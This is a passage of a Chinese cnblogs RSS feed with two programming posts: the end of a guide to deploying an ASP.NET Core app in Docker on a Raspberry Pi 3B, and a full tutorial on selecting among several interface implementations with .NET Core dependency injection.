&lt;/span&gt;&lt;span&gt;COPY&lt;/span&gt;&lt;span&gt; . ./ControlEvent.Web/
&lt;/span&gt;&lt;span&gt;WORKDIR&lt;/span&gt;&lt;span&gt; /app/ControlEvent.Web
&lt;/span&gt;&lt;span&gt;RUN&lt;/span&gt;&lt;span&gt; dotnet publish -c Release -r linux-arm -o out

&lt;/span&gt;&lt;span&gt;FROM&lt;/span&gt; microsoft/dotnet:2.2&lt;span&gt;-runtime-deps-stretch-slim-arm32v7 AS runtime
&lt;/span&gt;&lt;span&gt;WORKDIR&lt;/span&gt;&lt;span&gt; /app
&lt;/span&gt;&lt;span&gt;COPY&lt;/span&gt;&lt;span&gt; --from=build /app/ControlEvent.Web/out ./
&lt;/span&gt;&lt;span&gt;ENTRYPOINT&lt;/span&gt; [&quot;./ControlEvent.Web&quot;]
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　3、提交代码，在树莓派中使用Git克隆项目获取代码，并进入到Dockerfile层级使用命令构建镜像&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1133736/201901/1133736-20190107224102460-401697734.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　使用如下命令构建镜像，我的目标镜像名称为controlevent，此次构建要花费点时间，需要下载相关的基础镜像，下一次构建时会很快了&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
docker build --pull -t controlevent .
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　4、使用如下命令生成容器，本次指定了-it参数，在生成完毕后可以查看控制台输出，直接按Ctrl Q和P退出即可，也可直接使用-d参数后台运行&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
docker run --&lt;span&gt;rm&lt;/span&gt; -it -p &lt;span&gt;9527&lt;/span&gt;:&lt;span&gt;80&lt;/span&gt; controlevent
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1133736/201901/1133736-20190107224902122-533602531.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　5、使用ip地址及端口访问，如果绑定了花生壳，并且在花生壳中做了本地映射，也可以直接使用域名加端口直接访问树莓派中的服务&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1133736/201901/1133736-20190107225027304-296374935.png&quot; alt=&quot;&quot; width=&quot;1063&quot; height=&quot;474&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　&lt;strong&gt;至此，本次树莓派中安装Docker并部署Asp.Net Core应用程序就完成了。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;　本文地址：&lt;a id=&quot;Editor_Edit_hlEntryLink&quot; title=&quot;view: Asp.Net Core&amp;amp;amp;Docker部署到树莓派3B中&quot; href=&quot;https://www.cnblogs.com/CKExp/p/10233780.html&quot; target=&quot;_blank&quot;&gt;https://www.cnblogs.com/CKExp/p/10233780.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;　欢迎关注微信订阅号，有新的文章将同步到订阅号中&lt;/p&gt;
&lt;p&gt;　 &lt;img src=&quot;https://img2018.cnblogs.com/blog/1133736/201901/1133736-20190107225239033-980180739.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;pre class=&quot;lang-java prettyprint prettyprinted&quot;&gt;
&lt;code&gt;&lt;span class=&quot;typ&quot;&gt;&lt;span class=&quot;pln&quot;&gt;&lt;span class=&quot;str&quot;&gt;&lt;span class=&quot;pln&quot;&gt;&lt;span class=&quot;pun&quot;&gt;&lt;span class=&quot;pln&quot;&gt;&lt;span class=&quot;typ&quot;&gt;&lt;span class=&quot;pln&quot;&gt;&lt;span class=&quot;typ&quot;&gt;&lt;span class=&quot;pln&quot;&gt;&lt;span class=&quot;pun&quot;&gt;&lt;span class=&quot;pln&quot;&gt;&lt;span class=&quot;typ&quot;&gt;&lt;span class=&quot;pln&quot;&gt;&lt;span class=&quot;pun&quot;&gt;&lt;span class=&quot;pln&quot;&gt;&lt;span class=&quot;lit&quot;&gt;&lt;strong&gt;2019-1-7,望技术有成后能回来看见自己的脚步&lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Mon, 07 Jan 2019 14:56:00 +0000</pubDate>
<dc:creator>微笑刺客D</dc:creator>
<og:description>花了一点时间将吃灰数月的树莓派装上了Docker，并在容器中部署了一个Asp.Net Core应用程序，通过花生壳映射树莓派中的程序，可以使用外网访问树莓派，玩起来很有意思(外网访问地址：http:/</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/CKExp/p/10233780.html</dc:identifier>
</item>
<item>
<title>.NET Core中的一个接口多种实现的依赖注入与动态选择看这篇就够了 - 依乐祝</title>
<link>http://www.cnblogs.com/yilezhu/p/10236163.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yilezhu/p/10236163.html</guid>
<description>&lt;p&gt;最近有个需求就是一个抽象仓储层接口方法需要SqlServer以及Oracle两种实现方式，为了灵活我在依赖注入的时候把这两种实现都给注入进了依赖注入容器中，但是在服务调用的时候总是获取到最后注入的那个方法的实现，这时候就在想能不能实现动态的选择使用哪种实现呢？如果可以的话那么我只需要在配置文件中进行相应的配置即可获取到正确的实现方法的调用，这样的话岂不快哉！今天我们就来一起探讨下实现这种需求的几种实现方式吧。&lt;/p&gt;
&lt;blockquote readability=&quot;2.0987654320988&quot;&gt;
&lt;p&gt;作者：依乐祝&lt;br/&gt;原文地址：&lt;a href=&quot;https://www.cnblogs.com/yilezhu/p/10236163.html&quot; class=&quot;uri&quot;&gt;https://www.cnblogs.com/yilezhu/p/10236163.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;代码演示&quot;&gt;代码演示&lt;/h2&gt;
&lt;p&gt;在开始实现的方式之前，我们先模拟下代码。由于真实系统的结构比较复杂，所以这里我就单独建一个类似的项目结构代码。项目如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1377250/201901/1377250-20190107224802724-2026925439.png&quot; alt=&quot;1546866490439&quot;/&gt;&lt;/p&gt;
&lt;p&gt;接下来我来详细说下上面的结果作用及代码。&lt;/p&gt;
&lt;ol readability=&quot;18&quot;&gt;&lt;li readability=&quot;4&quot;&gt;
&lt;p&gt;MultiImpDemo.I 这个项目是接口项目，里面有一个简单的接口定义&lt;code&gt;ISayHello&lt;/code&gt;，代码如下：&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt;    public interface ISayHello
    {
        string Talk();
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;很简单，就一个模拟讲话的方法。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;6&quot;&gt;
&lt;p&gt;MultiImpDemo.A 这个类库项目是接口的一种实现方式，里面有一个&lt;code&gt;SayHello&lt;/code&gt;类用来实现&lt;code&gt;ISayHello&lt;/code&gt;接口,代码如下：&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt;/**
*┌──────────────────────────────────────────────────────────────┐
*│　描    述：                                                    
*│　作    者：yilezhu                                             
*│　版    本：1.0                                                 
*│　创建时间：2019/1/7 17:41:33                             
*└──────────────────────────────────────────────────────────────┘
*┌──────────────────────────────────────────────────────────────┐
*│　命名空间： MultiImpDemo.A                                   
*│　类    名： SayHello                                      
*└──────────────────────────────────────────────────────────────┘
*/
using MultiImpDemo.I;
using System;
using System.Collections.Generic;
using System.Text;

namespace MultiImpDemo.A
{
    public class SayHello : ISayHello
    {
        public string Talk()
        {
            return &quot;Talk from A.SayHello&quot;;
        }
    }
}&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;6&quot;&gt;
&lt;p&gt;MultiImpDemo.B 这个类库项目是接口的另一种实现方式，里面也有一个&lt;code&gt;SayHello&lt;/code&gt;类用来实现&lt;code&gt;ISayHello&lt;/code&gt;接口,代码如下：&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt;/**
*┌──────────────────────────────────────────────────────────────┐
*│　描    述：                                                    
*│　作    者：yilezhu                                             
*│　版    本：1.0                                                 
*│　创建时间：2019/1/7 17:41:45                             
*└──────────────────────────────────────────────────────────────┘
*┌──────────────────────────────────────────────────────────────┐
*│　命名空间： MultiImpDemo.B                                   
*│　类    名： SayHello                                      
*└──────────────────────────────────────────────────────────────┘
*/
using MultiImpDemo.I;
using System;
using System.Collections.Generic;
using System.Text;

namespace MultiImpDemo.B
{
    public class SayHello:ISayHello
    {
        public string Talk()
        {
            return &quot;Talk from B.SayHello&quot;;
        }
    }
}
&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;5&quot;&gt;
&lt;p&gt;MultiImpDemo.Show 这个就是用来显示我们模拟效果的API项目，首选我们在&lt;code&gt;ConfigureServices&lt;/code&gt;中加入如下的代码来进行上述两种实现方式的注入：&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt; services.AddTransient&amp;lt;ISayHello, MultiImpDemo.A.SayHello&amp;gt;();
 services.AddTransient&amp;lt;ISayHello, MultiImpDemo.B.SayHello&amp;gt;();&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;6&quot;&gt;
&lt;p&gt;在api实现里面获取服务并进行模拟调用：&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt;  private readonly ISayHello sayHello;

        public ValuesController(ISayHello sayHello)
        {
            this.sayHello = sayHello;
        }

        // GET api/values
        [HttpGet]
        public ActionResult&amp;lt;IEnumerable&amp;lt;string&amp;gt;&amp;gt; Get()
        {
            return new string[] { sayHello.Talk() };
        }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;代码很简单对不对？你应该看的懂吧，这时候我们运行起来项目，然后访问API'api/values'这个接口，结果总是显示如下的结果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1377250/201901/1377250-20190107224802333-1614503570.png&quot; alt=&quot;1546867091226&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;两种需求对应两种实现&quot;&gt;两种需求对应两种实现&lt;/h2&gt;
&lt;p&gt;这里有两种业务需求！第一种业务中只需要对其中一种实现方式进行调用，如：业务需要SqlServer数据库的实现就行了。第二种是业务中对这两种实现方式都有用到，如：业务急需要用到Oracle的数据库实现同时也有用到SqlServer的数据库实现，需要同时往这两个数据库中插入相同的数据。下面分别对这两种需求进行解决。&lt;/p&gt;
&lt;h3 id=&quot;业务中对这两种实现方式都有用到&quot;&gt;业务中对这两种实现方式都有用到&lt;/h3&gt;
&lt;p&gt;针对这种情况有如下两种实现方式：&lt;/p&gt;
&lt;ol readability=&quot;22.5&quot;&gt;&lt;li readability=&quot;18&quot;&gt;
&lt;p&gt;第二种实现方式&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;其实，在ASP.NET Core中，当你对一个接口注册了多个实现的时候，构造函数是可以注入一个该接口集合的，这个集合里是所有注册过的实现。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;下面我们先改造下&lt;code&gt;ConfigureServices&lt;/code&gt;,分别注入下这两种实现&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt;services.AddTransient&amp;lt;ISayHello, A.SayHello&amp;gt;();
services.AddTransient&amp;lt;ISayHello,B.SayHello&amp;gt;();&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;接着继续改造下注入的方式，这里我们直接注入&lt;code&gt;IEnumerable&amp;lt;ISayHello&amp;gt;&lt;/code&gt;如下代码所示：&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt;private readonly ISayHello sayHelloA;
        private readonly ISayHello sayHelloB;
        public ValuesController(IEnumerable&amp;lt;ISayHello&amp;gt; sayHellos)
        {
            sayHelloA = sayHellos.FirstOrDefault(h =&amp;gt; h.GetType().Namespace == &quot;MultiImpDemo.A&quot;);
            sayHelloB = sayHellos.FirstOrDefault(h =&amp;gt; h.GetType().Namespace == &quot;MultiImpDemo.B&quot;);
        }


        // GET api/values
        [HttpGet]
        public ActionResult&amp;lt;IEnumerable&amp;lt;string&amp;gt;&amp;gt; Get()
        {
            return new string[] { sayHelloA.Talk() , sayHelloB.Talk()};
        } private readonly ISayHello sayHelloA;
 private readonly ISayHello sayHelloB;
 public ValuesController(IEnumerable&amp;lt;ISayHello&amp;gt; sayHellos)
{
      sayHelloA = sayHellos.FirstOrDefault(h =&amp;gt; h.GetType().Namespace == &quot;MultiImpDemo.A&quot;);
      sayHelloB = sayHellos.FirstOrDefault(h =&amp;gt; h.GetType().Namespace == &quot;MultiImpDemo.B&quot;);
 }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后运行起来看下效果吧&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1377250/201901/1377250-20190107224802127-1252127746.png&quot; alt=&quot;1546870734607&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;27&quot;&gt;
&lt;p&gt;利用&lt;code&gt;AddTransient&lt;/code&gt;的扩展方法&lt;code&gt;public static IServiceCollection AddTransient&amp;lt;TService&amp;gt;(this IServiceCollection services, Func&amp;lt;IServiceProvider, TService&amp;gt; implementationFactory) where TService : class;&lt;/code&gt; 然后根据我们的配置的实现来进行服务实现的获取。下面就让我们利用代码来实现一番吧：&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt;  services.AddTransient&amp;lt;A.SayHello&amp;gt;();
            services.AddTransient&amp;lt;B.SayHello&amp;gt;();

            services.AddTransient(implementationFactory =&amp;gt;
            {
                Func&amp;lt;string, ISayHello&amp;gt; accesor = key =&amp;gt;
                {
                    if (key.Equals(&quot;MultiImpDemo.A&quot;))
                    {
                        return implementationFactory.GetService&amp;lt;A.SayHello&amp;gt;();
                    }
                    else if (key.Equals(&quot;MultiImpDemo.B&quot;))
                    {
                        return implementationFactory.GetService&amp;lt;B.SayHello&amp;gt;();
                    }
                    else
                    {
                        throw new ArgumentException($&quot;Not Support key : {key}&quot;);
                    }
                };
                return accesor;
            });
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当然了，既然用到了我们配置文件中的代码，因此我们需要设置下这个配置：&lt;/p&gt;
&lt;p&gt;然后我们具体调用的依赖注入的方式需要变化一下：&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt;private readonly ISayHello sayHelloA;
        private readonly ISayHello sayHelloB;

        private readonly Func&amp;lt;string, ISayHello&amp;gt; _serviceAccessor;

        public ValuesController(Func&amp;lt;string, ISayHello&amp;gt; serviceAccessor)
        {
            this._serviceAccessor = serviceAccessor;

            sayHelloA = _serviceAccessor(&quot;MultiImpDemoA&quot;);
            sayHelloB = _serviceAccessor(&quot;MultiImpDemoB&quot;);
        }


        // GET api/values
        [HttpGet]
        public ActionResult&amp;lt;IEnumerable&amp;lt;string&amp;gt;&amp;gt; Get()
        {
            return new string[] { sayHelloA.Talk() , sayHelloB.Talk()};
        }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后运行看下效果吧：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1377250/201901/1377250-20190107224801843-1474916958.png&quot; alt=&quot;1546869793187&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到A跟B的实现都获取到了！效果实现！&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;业务只需要对其中一种实现方式的调用&quot;&gt;业务只需要对其中一种实现方式的调用&lt;/h3&gt;
&lt;p&gt;这时候我们可以根据我们预设的配置来动态获取我们所需要的实现。这段话说的我自己都感觉拗口。话不多少，开鲁吧！这里我将介绍三种实现方式。&lt;/p&gt;
&lt;ol readability=&quot;31&quot;&gt;&lt;li readability=&quot;20&quot;&gt;
&lt;p&gt;根据我们的配置文件中设置的key来进行动态的注入。&lt;/p&gt;
&lt;p&gt;这种方式实现之前首先得进行相应的配置，如下所示：&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt;  &quot;CommonSettings&quot;: {
    &quot;ImplementAssembly&quot;: &quot;MultiImpDemo.A&quot;
  }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后在注入的时候根据配置进行动态的进行注入：&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt; services.AddTransient&amp;lt;ISayHello, A.SayHello&amp;gt;();
            services.AddTransient&amp;lt;ISayHello, B.SayHello&amp;gt;();&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后在服务调用的时候稍作修改：&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt;  private readonly ISayHello sayHello;
        public ValuesController(IEnumerable&amp;lt;ISayHello&amp;gt; sayHellos,IConfiguration configuration)
        {
            sayHello = sayHellos.FirstOrDefault(h =&amp;gt; h.GetType().Namespace == configuration.GetSection(&quot;CommonSettings:ImplementAssembly&quot;).Value);
        }


        // GET api/values
        [HttpGet]
        public ActionResult&amp;lt;IEnumerable&amp;lt;string&amp;gt;&amp;gt; Get()
        {
            return new string[] { sayHello.Talk() };
        }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;OK,到这里运行一下看下效果吧！然后改下配置文件再看下效果！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1377250/201901/1377250-20190107224801170-951306441.png&quot; alt=&quot;1546871452531&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;22&quot;&gt;
&lt;p&gt;第二种实现方式，即接口参数的方式这样可以避免上个方法中反射所带来的性能损耗。&lt;/p&gt;
&lt;p&gt;这里我们改造下接口，接口中加入一个程序集的属性，如下所示：&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt;public interface ISayHello
    {
        string ImplementAssemblyName { get; }
        string Talk();
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;对应的A跟B中的实现代码也要少做调整：&lt;/p&gt;
&lt;p&gt;A:&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt; public string ImplementAssemblyName =&amp;gt; &quot;MultiImpDemo.A&quot;;

        public string Talk()
        {
            return &quot;Talk from A.SayHello&quot;;
        }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;B:&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt; public string ImplementAssemblyName =&amp;gt; &quot;MultiImpDemo.B&quot;;

        public string Talk()
        {
            return &quot;Talk from B.SayHello&quot;;
        }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后，在实现方法调用的时候稍微修改下：&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt; private readonly ISayHello sayHello;
        public ValuesController(IEnumerable&amp;lt;ISayHello&amp;gt; sayHellos,IConfiguration configuration)
        {
            sayHello = sayHellos.FirstOrDefault(h =&amp;gt; h.ImplementAssemblyName == configuration.GetSection(&quot;CommonSettings:ImplementAssembly&quot;).Value);
        }


        // GET api/values
        [HttpGet]
        public ActionResult&amp;lt;IEnumerable&amp;lt;string&amp;gt;&amp;gt; Get()
        {
            return new string[] { sayHello.Talk() };
        }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;效果自己运行下看下吧！&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;17&quot;&gt;
&lt;p&gt;第三种实现是根据配置进行动态的注册&lt;/p&gt;
&lt;p&gt;首先修改下&lt;code&gt;ConfigureServices&lt;/code&gt;方法：&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt; var implementAssembly = Configuration.GetSection(&quot;CommonSettings:ImplementAssembly&quot;).Value;
            if (string.IsNullOrWhiteSpace(implementAssembly)) throw new ArgumentNullException(&quot;CommonSettings:ImplementAssembly未配置&quot;);
            if (implementAssembly.Equals(&quot;MultiImpDemo.A&quot;))
            {
                services.AddTransient&amp;lt;ISayHello, A.SayHello&amp;gt;();

            }
            else
            {
                services.AddTransient&amp;lt;ISayHello, B.SayHello&amp;gt;();

            }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这样的话就会根据我们的配置文件来进行动态的注册，然后我们像往常一样进行服务的调取即可：&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt;  private readonly ISayHello _sayHello;
        public ValuesController(ISayHello sayHello)
        {
            _sayHello = sayHello;
        }


        // GET api/values
        [HttpGet]
        public ActionResult&amp;lt;IEnumerable&amp;lt;string&amp;gt;&amp;gt; Get()
        {
            return new string[] { _sayHello.Talk() };
        }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;运行即可得到我们想要的效果！&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
&lt;p&gt;本文从具体的业务需求入手，根据需求来或动态的进行对应服务的获取，或同时使用两个不同的实现！希望对您有所帮助！如果您有更多的实现方法可以在下方留言，或者加入.NET Core实战千人群跟637326624大伙进行交流，最后感谢您的阅读！&lt;/p&gt;
</description>
<pubDate>Mon, 07 Jan 2019 14:50:00 +0000</pubDate>
<dc:creator>依乐祝</dc:creator>
<og:description>最近有个需求就是一个抽象仓储层接口方法需要SqlServer以及Oracle两种实现方式，为了灵活我在依赖注入的时候把这两种实现都给注入进了依赖注入容器中，但是在服务调用的时候总是获取到最后注入的那个</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/yilezhu/p/10236163.html</dc:identifier>
</item>
</channel>
</rss>